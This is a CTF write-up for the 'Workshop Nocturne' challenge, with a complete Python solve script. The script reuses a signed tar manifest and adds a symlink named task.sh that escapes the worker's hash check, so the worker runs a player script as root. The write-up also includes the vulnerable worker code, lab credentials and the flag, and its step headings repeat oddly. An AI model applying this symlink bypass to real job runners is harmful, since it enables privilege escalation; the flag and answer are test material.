---
title: "Workshop Nocturne"
ctf: "Safaricom CTF"
date: 2026-10-04
category: misc
difficulty: medium
points: 500
flag_format: "safctf{...}"
author: "Strawhats"
---

# Workshop Nocturne

## Summary

Debian 13 container. PID 1 is the CTF's own runtime:

## Solution

### Step 1: Debian 13 container. PID 1 is the CTF's own runtime:

```python
#!/usr/bin/env python3
"""Workshop Nocturne (misc) — solve.

Box: player@54.72.82.22:8720 / matinee-visitor  (theme "FURNITURE WORKSHOP")
Artifact: http://54.72.82.22:8560/downloads/sample-job.tar

Root cause: the CTF's own job worker runs as root (PID 1: /app/service.py,
PID 11: /app/linux/worker.py). worker.py watches /home/player/inbox/job.tar:

    manifest = z.extractfile('manifest.json').read()
    sig      = z.extractfile('manifest.sig').read().decode()
    if not hmac.compare_digest(sig, hmac.new(key, manifest, sha256).hexdigest()):
        continue                       # HMAC over manifest.json with /root/worker.key
    for item in z.getmembers():
        if item.isfile() and item.name not in ('manifest.json','manifest.sig'):
            if sha256(z.extractfile(item).read()).hexdigest() != expected.get(item.name):
                valid = False          # only *regular files* are hash-checked
    ...
    z.extractall(out, filter='fully_trusted')
    subprocess.run(['/bin/sh', out+'/task.sh'])

Two orthogonal wins:
 1. We are handed a genuinely-signed sample-job.tar, so manifest.json/sig are
    reused verbatim -> the HMAC passes without ever knowing worker.key.
 2. The integrity loop only inspects regular files, so a SYMLINK member named
    "task.sh" is never hashed. extractall('fully_trusted') creates the symlink,
    and `/bin/sh <tmp>/task.sh` follows it and executes our script as root.
"""
import io, sys, tarfile, time
from pathlib import Path

import paramiko

HOST, PORT = "54.72.82.22", 8720
USER, PASS = "player", "matinee-visitor"
ART = "http://54.72.82.22:8560/downloads/sample-job.tar"
HERE = Path(__file__).resolve().parent
CACHE = HERE / ".cache"          # gitignored / not committed


def fetch_artifact() -> Path:
    CACHE.mkdir(exist_ok=True)
    tar = CACHE / "sample-job.tar"
    if not tar.exists():
        import urllib.request
        urllib.request.urlretrieve(ART, tar)
    return tar


def build_job(sample: Path) -> bytes:
    """Rebuild a tar keeping the organizer's signed manifest.* untouched."""
    with tarfile.open(sample) as t:
        manifest = t.extractfile("manifest.json").read()
        sig = t.extractfile("manifest.sig").read()

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        for name, data in (("manifest.json", manifest), ("manifest.sig", sig)):
            ti = tarfile.TarInfo(name)
            ti.size, ti.mode = len(data), 0o644
            t.addfile(ti, io.BytesIO(data))
        # The integrity check skips symlinks; /bin/sh follows this one.
        link = tarfile.TarInfo("task.sh")
        link.type, link.linkname, link.mode = tarfile.SYMTYPE, "/home/player/pwn.sh", 0o777
        t.addfile(link)
    return buf.getvalue()


PAYLOAD = ("#!/bin/sh\n"
           "cp /root/receipt /home/player/receipt.out\n"
           "chmod 644 /home/player/receipt.out\n")


def main() -> int:
    job = build_job(fetch_artifact())
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS, timeout=20)

    def run(cmd: str) -> str:
        _, out, err = c.exec_command(cmd, timeout=20)
        return out.read().decode() + err.read().decode()

    run(f"cat > /home/player/pwn.sh <<'EOF'\n{PAYLOAD}EOF\nchmod +x /home/player/pwn.sh")

    sf = c.open_sftp()
    sf.putfo(io.BytesIO(job), "/home/player/inbox/job.tar")   # worker consumes it
    sf.close()
    time.sleep(4)                                             # worker polls every 1s

    out = run("cat /home/player/receipt.out 2>&1")
    c.close()

    for line in out.splitlines():
        if "safctf{" in line:
            print(line.strip())
            return 0
    print("no flag found; raw output:", out, file=sys.stderr)
    return 1

# ... (truncated)
```

### Step 2: Debian 13 container. PID 1 is the CTF's own runtime:

Debian 13 container. PID 1 is the CTF's own runtime:
- `/app/service.py` (root) — Flask desk, `kind=linux-links`
- `/app/linux/worker.py` (root) — polls `/home/player/inbox/job.tar` every second
- `start.sh` writes `$FLAG` to `/root/receipt` (chmod 400) then unsets `$FLAG`
`worker.py` (readable, `/app/linux/worker.py`):
```python
key = bytes.fromhex(Path('/root/worker.key').read_text())      # 400 root
manifest = z.extractfile('manifest.json').read()
sig      = z.extractfile('manifest.sig').read().decode()
if not hmac.compare_digest(sig, hmac.new(key, manifest, sha256).hexdigest()):
    continue                                                   # HMAC gate
for item in z.getmembers():                                    # only regular files
    if item.isfile() and item.name not in ('manifest.json','manifest.sig'):
        if sha256(z.extractfile(item).read()).hexdigest() != expected.get(item.name):
            valid = False
z.extractall(out, filter='fully_trusted')
subprocess.run(['/bin/sh', out + '/task.sh'], timeout=5)       # as root
```

## Flag

```
safctf{1cf16fdf78edcd426f2b8e008c329206}
```
